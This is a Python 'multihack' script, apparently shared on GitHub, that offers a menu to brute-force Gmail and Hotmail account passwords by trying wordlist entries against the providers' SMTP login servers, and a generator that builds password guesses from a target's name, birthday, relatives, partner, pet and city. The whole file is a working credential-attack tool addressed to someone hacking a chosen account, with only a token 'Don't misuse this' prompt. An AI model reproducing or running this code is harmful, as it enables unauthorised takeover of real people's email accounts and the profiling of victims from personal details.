# Coded by: Sp1derman hacker
# Github: https://github.com/sp1dermanhackeryoutube
# YouTube: https://www.youtube.com/channel/UCwL-qGwm5ncO6IfB83x35BA

import smtplib
import os
import string
import os, sys, time
from time import sleep as timeout
import webbrowser
import smtplib
import argparse
import time
import socket
import os
import threading
from ftplib import FTP
import datetime

print("Press enter to continue to the multihack")
print("")
print("")
print("")
print("")
print("")
print("")
input("          ")
os.system("clear")

print("")
trusted = input("\033[31m                                  Don't misuse this (ENTER) \033[0m")
os.system("clear")

print("\033[31m        __  __       _ _   _ _    _            _     \033[0m")
print("\033[31m       |  \/  |     | | | (_) |  | |          | |    \033[0m")
print("\033[31m       | \  / |_   _| | |_ _| |__| | __ _  ___| | __ \033[0m")
print("\033[31m       | |\/| | | | | | __| |  __  |/ _` |/ __| |/ / \033[0m")
print("\033[31m       | |  | | |_| | | |_| | |  | | (_| | (__|   <  \033[0m")
print("\033[31m       |_|  |_|\__,_|_|\__|_|_|  |_|\__,_|\___|_|\_\ \033[0m")
print("")
print("\033[31m                   Choose an option below:  \033[0m ")
print("")
print("\033[32m                   Created by: @Sp1derman hacker \033[0m")
print("")
print("\033[32m[1]\033[0m \033[31mGmail BruteForce\033[0m")
print("\033[32m[2]\033[0m \033[31mHotmail BruteForce\033[0m")
print("\033[32m[3]\033[0m \033[31mWordlist Generator\033[0m")
print("\033[32m[4]\033[0m \033[31mVisit My YouTube\033[0m")
var1 = "1"
var2 = "2"
var3 = "3"
var4 = "4"
option = input("Which attack do you want to do?: ")
if option == var1:
    os.system("clear")
    print("\033[34m  _____                 _ _   _                _                    _____  \033[0m")
    print("\033[34m  / ____|               (_) | | |              | |                  |  __ \ \033[0m")
    print("\033[34m | |  __ _ __ ___   __ _ _| | | |__   __ _  ___| | _____ _ __  __  _| |  | |\033[0m")
    print("\033[34m | | |_ | '_ ` _ \ / _` | | | | '_ \ / _` |/ __| |/ / _ \ '__| \ \/ / |  | |\033[0m")
    print("\033[34m | |__| | | | | | | (_| | | | | | | | (_| | (__|   <  __/ |     >  <| |__| |\033[0m")
    print("\033[34m  \_____|_| |_| |_|\__,_|_|_| |_| |_|\__,_|\___|_|\_\___|_|    /_/\_\_____/ \033[0m")
    print("")
    print("")
    print("\033[32m[1]\033[0m \033[34mStart the attack\033[0m")
    print("\033[32m[2]\033[0m \033[34mExit\033[0m")
    choice = input("\033[34mChoose a number: \033[0m")
    if choice == var1:
        file = input("\033[34mPath of the password list: \033[0m") # Gets the path of the wordlist
        passfile = open(file, 'r') # Open and reads the wordlist
        passfilet = passfile.readlines() # Reads the lines

        Gmail = input("\033[34mGmail to hack: \033[0m")
        os.system("clear")
        server = smtplib.SMTP("smtp.gmail.com", 587) # Server and port
        server.ehlo() # Type of method
        server.starttls() # Starts everything
        os.system("color A")
        for passw in passfilet: # Since the password is unkown, it will make passw equal to the password in the wordlist
            try:
                server.login(Gmail, passw) # Logging in with password
                server.quit()
                print("SUCCESS")
                print("\033[32mHACKED ACCOUNT: @\033[0m" + Gmail,"\033[32mPASSWORD IS: \033[0m" + passw)
                foundpasswords = open("/home/sp1derman/Desktop/multitools/Multitools/passwordsfound",'w')
                with foundpasswords as h:
                    h.write(passw)
                print("Password saved at the filename: /home/sp1derman/Desktop/multitools/Multitools/passwordsfound")

                break
            except smtplib.SMTPAuthenticationError:
                print("\033[31mPassowrd incorrect: \033[0m" + passw)
    else:
        exit()

elif option == var2:
    os.system("clear")
    print("\033[32m[1] Start the attack\033[0m")
    print("\033[32m[2] Exit\033[0m")
    opinion = input("\033[32mChoose a number: \033[0m")
    if opinion == "1":
        print("\033[35m")
        print(" _    _       _   __  __       _ _   _    _            _    _             ")
        print("| |  | |     | | |  \/  |     (_) | | |  | |          | |  (_)            ")
        print("| |__| | ___ | |_| \  / | __ _ _| | | |__| | __ _  ___| | ___ _ __   __ _ ")
        print("|  __  |/ _ \| __| |\/| |/ _` | | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
        print("| |  | | (_) | |_| |  | | (_| | | | | |  | | (_| | (__|   <| | | | | (_| |")
        print("|_|  |_|\___/ \__|_|  |_|\__,_|_|_| |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
        print("                                                                     __/ |")
        print("                                                                    |___/ ")
        print("")

        wordlist = input("Path to wordlist: ")
        wordfile = open(wordlist, 'r')
        readfile = wordfile.readlines()

        email = input("Email to hack: ")

        server = smtplib.SMTP("smtp.live.com:587")
        server.ehlo()
        server.starttls()
        print("[*] Starting attack...")
        for password in readfile:
            try:
                server.login(email, password)
                server.quit()
                print("[+] PASSWORD FOUND: {}".format(password))
                foundpasswords = open("/home/sp1derman/Desktop/multitools/Multitools/passwordsfound",'w')
                with foundpasswords as h:
                    h.write(password)
                print("Password saved at the filename: /home/sp1derman/Desktop/multitools/Multitools/passwordsfound")
                input("\033[0m")
            except smtplib.SMTPAuthenticationError as e:
                if "Authentication unsuccessful" in str(e):
                    print("[-] Trying login: {}".format(password))
                else:
                    print(str(e))
            except smtplib.SMTPServerDisconnected:
                print("Server disconnected")

elif option == var4:
    url = "https://www.youtube.com/channel/UCwL-qGwm5ncO6IfB83x35BA"
    webbrowser.open_new_tab(url)

elif option == var3:

    os.system("clear")
    print("\033[32m")
    print(" _____                           _             ")
    print("/ ____|                         | |            ")
    print("| |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ ")
    print("| | |_ |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|")
    print("| |__| |  __/ | | |  __/ | | (_| | || (_) | |   ")
    print(" \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   ")
    print("")
    print("")

    generatedfile = input("File path to write the generated wordlist (Text file that is empty): ")

    name = input("Enter target first name: ")



    lastname = input("Enter target last name: ")



    birthday = input("Enter target birthday (DDMMYYYY): ")



    year = input("Enter target year: ")



    friend = input("Enter target friend: ")



    partner = input("Enter target partner: ")



    parent = input("Enter one of the parents first name: ")



    parent2 = input("Enter another one of the parents first name: ")



    sibling = input("Enter a siblings first name: ")



    sibling2 = input("Enter another siblings first name: ")



    pet = input("Enter a pets name: ")



    car = input("Enter vehicle: ")



    company = input("Enter target School/Work/Company: ")



    country = input("Enter target country: ")



    city = input("Enter target city: ")



    words = input("Enter ONE keyword(1/9): ")



    words2 = input("Enter ONE more keyword(2/9): ")



    words3 = input("Enter ONE more keyword(3/9): ")



    words4 = input("Enter ONE more keyword(4/9): ")



    words5 = input("Enter ONE more keyword(5/9): ")



    words6 = input("Enter ONE more keyword(6/9): ")



    words7 = input("Enter ONE more keyword(7/9): ")



    words8 = input("Enter ONE more keyword(8/9): ")



    words9 = input("Enter ONE more keyword(9/9): \033[0m")



    wordlistlines = open(generatedfile,'w')

    with wordlistlines as w:

        w.write(name)

        w.write("\n")

        w.write(name + "123")

        w.write("\n")

        w.write(name + "1234")

        w.write("\n")

        w.write(name + "12345")

        w.write("\n")

        w.write(name + "123456")

        w.write("\n")

        w.write(name + "1234567")

        w.write("\n")

        w.write(name + "12345678")

        w.write("\n")

        w.write(name + birthday)

        w.write("\n")

        w.write(name + year)

        w.write("\n")

        w.write(name + city)

        w.write("\n")

        w.write(name + country)

        w.write("\n")

        w.write(name + lastname)

        w.write("\n")

        w.write(name + lastname + birthday)

        w.write("\n")

        w.write(name + lastname + year)

        w.write("\n")

        w.write(name + company)

        w.write("\n")

        w.write(name + words)

        w.write("\n")

        w.write(name + words2)

        w.write("\n")

        w.write(name + words3)

        w.write("\n")

        w.write(name + words4)

        w.write("\n")

        w.write(name + words5)

        w.write("\n")

        w.write(name + words6)

        w.write("\n")

        w.write(name + words7)

        w.write("\n")

        w.write(name + words8)

        w.write("\n")

        w.write(name + words9)

        w.write("\n")

        w.write(name + city)

        w.write("\n")

        w.write(name + country)

        w.write("\n")

        w.write(lastname)

        w.write("\n")

        w.write(lastname + words)

        w.write("\n")

        w.write(lastname + words2)

        w.write("\n")

        w.write(lastname + words3)

        w.write("\n")

        w.write(lastname + words4)

        w.write("\n")

        w.write(lastname + words5)

        w.write("\n")

        w.write(lastname + words6)

        w.write("\n")

        w.write(lastname + words7)

        w.write("\n")

        w.write(lastname + words8)

        w.write("\n")

        w.write(lastname + words9)

        w.write("\n")

        w.write(lastname + "123")

        w.write("\n")

        w.write(lastname + "1234")

        w.write("\n")

        w.write(lastname + "12345")

        w.write("\n")

        w.write(lastname + "123456")

        w.write("\n")

        w.write(lastname + "1234567")

        w.write("\n")

        w.write(lastname + "12345678")

        w.write("\n")

        w.write(lastname + name)

        w.write("\n")

        w.write(lastname + birthday)

        w.write("\n")

        w.write(lastname + year)

        w.write("\n")

        w.write(lastname + name)

        w.write("\n")

        w.write(lastname + name + birthday)

        w.write("\n")

        w.write(lastname + name + year)

        w.write("\n")

        w.write(birthday)

        w.write("\n")

        w.write(birthday + name)

        w.write("\n")

        w.write(birthday + lastname)

        w.write("\n")

        w.write(birthday + company)

        w.write("\n")

        w.write(year)

        w.write("\n")

        w.write(year + name)

        w.write("\n")

        w.write(year + lastname)

        w.write("\n")

        w.write(year + words)

        w.write("\n")

        w.write(year + words2)

        w.write("\n")

        w.write(year + words3)

        w.write("\n")

        w.write(year + words4)

        w.write("\n")

        w.write(year + words5)

        w.write("\n")

        w.write(year + words6)

        w.write("\n")

        w.write(year + words7)

        w.write("\n")

        w.write(year + words8)

        w.write("\n")

        w.write(year + words9)

        w.write("\n")

        w.write(year + city)

        w.write("\n")

        w.write(year + country)

        w.write("\n")

        w.write(words)

        w.write("\n")

        w.write(words + "12345")

        w.write("\n")

        w.write(words + "123456")

        w.write("\n")

        w.write(words + "12345678")

        w.write("\n")

        w.write(words + "1234")

        w.write("\n")

        w.write(words + "123")

        w.write("\n")

        w.write(words + "1234567")

        w.write("\n")

        w.write(words + name)

        w.write("\n")

        w.write(words + company)

        w.write("\n")

        w.write(words + lastname)

        w.write("\n")

        w.write(words + city)

        w.write("\n")

        w.write(words + country)

        w.write("\n")

        w.write(words + sibling)

        w.write("\n")

        w.write(words + sibling2)

        w.write("\n")

        w.write(words + parent)

        w.write("\n")

        w.write(words + parent2)

        w.write("\n")

        w.write(words + partner)

        w.write("\n")

        w.write(words + friend)

        w.write("\n")

        w.write(words + year)

        w.write("\n")

        w.write(words + birthday)

        w.write("\n")

        w.write(words + lastname)

        w.write("\n")

        w.write(words2)

        w.write("\n")

        w.write(words2 + "12345")

        w.write("\n")

        w.write(words2 + "123456")

        w.write("\n")

        w.write(words2 + "12345678")

        w.write("\n")

        w.write(words2 + "1234")

        w.write("\n")

        w.write(words2 + "123")

        w.write("\n")

        w.write(words2 + "1234567")

        w.write("\n")

        w.write(words2 + name)

        w.write("\n")

        w.write(words2 + company)

        w.write("\n")

        w.write(words2 + lastname)

        w.write("\n")

        w.write(words2 + city)

        w.write("\n")

        w.write(words2 + country)

        w.write("\n")

        w.write(words2 + sibling)

        w.write("\n")

        w.write(words2 + sibling2)

        w.write("\n")

        w.write(words2 + parent)

        w.write("\n")

        w.write(words2 + parent2)

        w.write("\n")

        w.write(words2 + partner)

        w.write("\n")

        w.write(words2 + friend)

        w.write("\n")

        w.write(words2 + year)

        w.write("\n")

        w.write(words2 + birthday)

        w.write("\n")

        w.write(words2 + lastname)

        w.write("\n")

        w.write(words3)

        w.write("\n")

        w.write(words3 + "12345")

        w.write("\n")

        w.write(words3 + "123456")

        w.write("\n")

        w.write(words3 + "12345678")

        w.write("\n")

        w.write(words3 + "1234")

        w.write("\n")

        w.write(words3 + "123")

        w.write("\n")

        w.write(words3 + "1234567")

        w.write("\n")

        w.write(words3 + name)

        w.write("\n")

        w.write(words3 + company)

        w.write("\n")

        w.write(words3 + lastname)

        w.write("\n")

        w.write(words3 + city)

        w.write("\n")

        w.write(words3 + country)

        w.write("\n")

        w.write(words3 + sibling)

        w.write("\n")

        w.write(words3 + sibling2)

        w.write("\n")

        w.write(words3 + parent)

        w.write("\n")

        w.write(words3 + parent2)

        w.write("\n")

        w.write(words3 + partner)

        w.write("\n")

        w.write(words3 + friend)

        w.write("\n")

        w.write(words3 + year)

        w.write("\n")

        w.write(words3 + birthday)

        w.write("\n")

        w.write(words3 + lastname)

        w.write("\n")

        w.write(words4)

        w.write("\n")

        w.write(words4 + "12345")

        w.write("\n")

        w.write(words4 + "123456")

        w.write("\n")

        w.write(words4 + "12345678")

        w.write("\n")

        w.write(words4 + "1234")

        w.write("\n")

        w.write(words4 + "123")

        w.write("\n")

        w.write(words4 + "1234567")

        w.write("\n")

        w.write(words4 + name)

        w.write("\n")

        w.write(words4 + company)

        w.write("\n")

        w.write(words4 + lastname)

        w.write("\n")

        w.write(words4 + city)

        w.write("\n")

        w.write(words4 + country)

        w.write("\n")

        w.write(words4 + sibling)

        w.write("\n")

        w.write(words4 + sibling2)

        w.write("\n")

        w.write(words4 + parent)

        w.write("\n")

        w.write(words4 + parent2)

        w.write("\n")

        w.write(words4 + partner)

        w.write("\n")

        w.write(words4 + friend)

        w.write("\n")

        w.write(words4 + year)

        w.write("\n")

        w.write(words4 + birthday)

        w.write("\n")

        w.write(words4 + lastname)

        w.write("\n")

        w.write(words5)

        w.write("\n")

        w.write(words5 + "12345")

        w.write("\n")

        w.write(words5 + "123456")

        w.write("\n")

        w.write(words5 + "12345678")

        w.write("\n")

        w.write(words5 + "1234")

        w.write("\n")

        w.write(words5 + "123")

        w.write("\n")

        w.write(words5 + "1234567")

        w.write("\n")

        w.write(words5 + name)

        w.write("\n")

        w.write(words5 + company)

        w.write("\n")

        w.write(words5 + lastname)

        w.write("\n")

        w.write(words5 + city)

        w.write("\n")

        w.write(words5 + country)

        w.write("\n")

        w.write(words5 + sibling)

        w.write("\n")

        w.write(words5 + sibling2)

        w.write("\n")

        w.write(words5 + parent)

        w.write("\n")

        w.write(words5 + parent2)

        w.write("\n")

        w.write(words5 + partner)

        w.write("\n")

        w.write(words5 + friend)

        w.write("\n")

        w.write(words5 + year)

        w.write("\n")

        w.write(words5 + birthday)

        w.write("\n")

        w.write(words5 + lastname)

        w.write("\n")

        w.write(words6)

        w.write("\n")

        w.write(words6 + "12345")

        w.write("\n")

        w.write(words6 + "123456")

        w.write("\n")

        w.write(words6 + "12345678")

        w.write("\n")

        w.write(words6 + "1234")

        w.write("\n")

        w.write(words6 + "123")

        w.write("\n")

        w.write(words6 + "1234567")

        w.write("\n")

        w.write(words6 + name)

        w.write("\n")

        w.write(words6 + company)

        w.write("\n")

        w.write(words6 + lastname)

        w.write("\n")

        w.write(words6 + city)

        w.write("\n")

        w.write(words6 + country)

        w.write("\n")

        w.write(words6 + sibling)

        w.write("\n")

        w.write(words6 + sibling2)

        w.write("\n")

        w.write(words6 + parent)

        w.write("\n")

        w.write(words6 + parent2)

        w.write("\n")

        w.write(words6 + partner)

        w.write("\n")

        w.write(words6 + friend)

        w.write("\n")

        w.write(words6 + year)

        w.write("\n")

        w.write(words6 + birthday)

        w.write("\n")

        w.write(words6 + lastname)

        w.write("\n")

        w.write(words7 + "12345")

        w.write("\n")

        w.write(words7 + "123456")

        w.write("\n")

        w.write(words7 + "12345678")

        w.write("\n")

        w.write(words7 + "1234")

        w.write("\n")

        w.write(words7 + "123")

        w.write("\n")

        w.write(words7 + "1234567")

        w.write("\n")

        w.write(words7)

        w.write("\n")

        w.write(words7 + name)

        w.write("\n")

        w.write(words7 + company)

        w.write("\n")

        w.write(words7 + lastname)

        w.write("\n")

        w.write(words7 + city)

        w.write("\n")

        w.write(words7 + country)

        w.write("\n")

        w.write(words7 + sibling)

        w.write("\n")

        w.write(words7 + sibling2)

        w.write("\n")

        w.write(words7 + parent)

        w.write("\n")

        w.write(words7 + parent2)

        w.write("\n")

        w.write(words7 + partner)

        w.write("\n")

        w.write(words7 + friend)

        w.write("\n")

        w.write(words7 + year)

        w.write("\n")

        w.write(words7 + birthday)

        w.write("\n")

        w.write(words7 + lastname)

        w.write("\n")

        w.write(words8)

        w.write("\n")

        w.write(words8 + "123")

        w.write("\n")

        w.write(words8 + "123456")

        w.write("\n")

        w.write(words8 + "12345")

        w.write("\n")

        w.write(words8 + "1234")

        w.write("\n")

        w.write(words8 + "12345678")

        w.write("\n")

        w.write(words8 + "1234567")

        w.write("\n")

        w.write(words8 + name)

        w.write("\n")

        w.write(words8 + company)

        w.write("\n")

        w.write(words8 + lastname)

        w.write("\n")

        w.write(words8 + city)

        w.write("\n")

        w.write(words8 + country)

        w.write("\n")

        w.write(words8 + sibling)

        w.write("\n")

        w.write(words8 + sibling2)

        w.write("\n")

        w.write(words8 + parent)

        w.write("\n")

        w.write(words8 + parent2)

        w.write("\n")

        w.write(words8 + partner)

        w.write("\n")

        w.write(words8 + friend)

        w.write("\n")

        w.write(words8 + year)

        w.write("\n")

        w.write(words8 + birthday)

        w.write("\n")

        w.write(words8 + lastname)

        w.write("\n")

        w.write(words9)

        w.write("\n")

        w.write(words9 + name)

        w.write("\n")

        w.write(words9 + company)

        w.write("\n")

        w.write(words9 + lastname)

        w.write("\n")

        w.write(words9 + city)

        w.write("\n")

        w.write(words9 + country)

        w.write("\n")

        w.write(words9 + sibling)

        w.write("\n")

        w.write(words9 + sibling2)

        w.write("\n")

        w.write(words9 + parent)

        w.write("\n")

        w.write(words9 + parent2)

        w.write("\n")

        w.write(words9 + partner)

        w.write("\n")

        w.write(words9 + friend)

        w.write("\n")

        w.write(words9 + year)

        w.write("\n")

        w.write(words9 + birthday)

        w.write("\n")

        w.write(words9 + lastname)

        w.write("\n")

        w.write("password")

        w.write("\n")

        w.write("iloveyou")

        w.write("\n")

        w.write("12345")

        w.write("\n")

        w.write("123456")

        w.write("\n")

        w.write("12345678")

        w.write("\n")

        w.write(city)

        w.write("\n")

        w.write(city + name)

        w.write("\n")

        w.write(city + lastname)

        w.write("\n")

        w.write(city + country)

        w.write("\n")

        w.write(city + partner)

        w.write("\n")

        w.write(city + year)

        w.write("\n")

        w.write(city + birthday)

        w.write("\n")

        w.write(city + parent)

        w.write("\n")

        w.write(city + parent2)

        w.write("\n")

        w.write(city + sibling)

        w.write("\n")

        w.write(city + sibling2)

        w.write("\n")

        w.write(city + words)

        w.write("\n")

        w.write(city + words2)

        w.write("\n")

        w.write(city + words3)

        w.write("\n")

        w.write(city + words4)

        w.write("\n")

        w.write(city + words5)

        w.write("\n")

        w.write(city + words6)

        w.write("\n")

        w.write(city + words7)

        w.write("\n")

        w.write(city + words8)

        w.write("\n")

        w.write(city + words9)

        w.write("\n")

        w.write("admin")

        w.write("\n")

        w.write("user")

        w.write("\n")

        w.write("username")

        w.write("\n")

        w.write(car + words)

        w.write("\n")

        w.write(car + words2)

        w.write("\n")

        w.write(car + words3)

        w.write("\n")

        w.write(car + words4)

        w.write("\n")

        w.write(car + words5)

        w.write("\n")

        w.write(car + words6)

        w.write("\n")

        w.write(car + words7)

        w.write("\n")

        w.write(car + words8)

        w.write("\n")

        w.write(car + words9)



    print("Successfully wrote the generated wordlist to: " + generatedfile)

    input("")
